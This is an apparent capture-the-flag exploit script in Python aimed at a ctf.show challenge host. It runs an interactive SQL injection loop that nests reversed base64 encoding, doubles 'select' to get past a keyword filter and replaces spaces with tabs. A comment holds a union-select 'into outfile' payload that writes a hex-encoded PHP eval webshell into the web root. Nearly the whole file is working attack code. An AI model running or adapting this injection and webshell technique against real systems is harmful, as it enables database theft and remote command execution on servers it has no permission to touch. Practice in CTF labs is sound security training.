import requests,json
import base64

host='db4b9a40-128d-49d4-aec7-8e2985e161b6.chall.ctf.show'

urltk='http://'+host+'/api/getToken.php'
urlsql='http://'+host+'/api/index.php'

#写马  pass=cmd
# union select 1,0x3c3f70687020406576616c28245f504f53545b636d645d293f3e,1 into outfile '/var/www/html/xx.php'


def str2Dir(cph='', spl1='\n', sp2=':'):
    return {i[:i.find(sp2)].strip(): i[i.find(sp2) + 1:].strip() for i in cph.split(spl1)}
cook=str2Dir('PHPSESSID=0pahiqjtsge12gapejfidugb62; UM_distinctid=17508a480ae4ec-02c75493c974c4-333376b-1fa400-17508a480af423',';','=')

gth='''Accept: */*
User-Agent: Mozilla/5.0
X-Requested-With: XMLHttpRequest
Referer:ctf.show
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9'''
gth = str2Dir(gth)
gth['Host'] = host
getsql='''Content-Type:charset=UTF-8
Referer: ctf.show
User-Agent: sqlmap/1.4.10.11#dev (http://sqlmap.org)
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close'''
getsql=str2Dir(getsql)
getsql['Host'] = host
def bd(st):
    return base64.b64decode(st).decode()
def chk(pl):
    ses = requests.session()
    ses.get(urltk,headers=gth,cookies=cook)
    pl=base64.b64encode(base64.b64encode(pl[::-1].encode()).decode()[::-1].encode()).decode()
    print(pl,'-->',bd((bd(pl)[::-1]))[::-1])

    req=ses.put(urlsql,headers=getsql,cookies=cook,data='id='+pl)
    try:
        for  i in  (json.loads(req.text)['data']) :print(i)
    except:
        print(req.text)


while True:
    chk('0\''+input('ID=').replace('select','selselectect').replace(' ','\t')+'#')